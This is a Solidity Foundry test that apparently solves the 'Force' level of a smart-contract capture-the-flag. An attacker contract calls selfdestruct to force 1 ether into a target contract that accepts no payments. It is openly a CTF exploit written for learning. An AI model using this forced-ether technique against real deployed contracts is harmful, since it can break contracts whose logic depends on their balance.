// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/7-Force.sol";

contract ForceTest is Test {
    Force public forceCTF;

    function setUp() public {
        forceCTF = new Force();
    }

    function testAttack() public {
        // deploy attacker contract
        ForceAttacker attacker = new ForceAttacker{value: 1 ether}(forceCTF);

        // send attacker contract ETH
        address(attacker).call{value: 1 ether}("");

        // attack & selfdestruct
        attacker.attack();

        // assert if ForceCTF has funds
        assertEq(address(forceCTF).balance, 1 ether);
    }
}

contract ForceAttacker {
    Force public forceCTF;

    constructor(Force _forceCTF) payable {
        forceCTF = _forceCTF;
    }

    function attack() public {
        selfdestruct(payable(address(forceCTF)));
    }
}
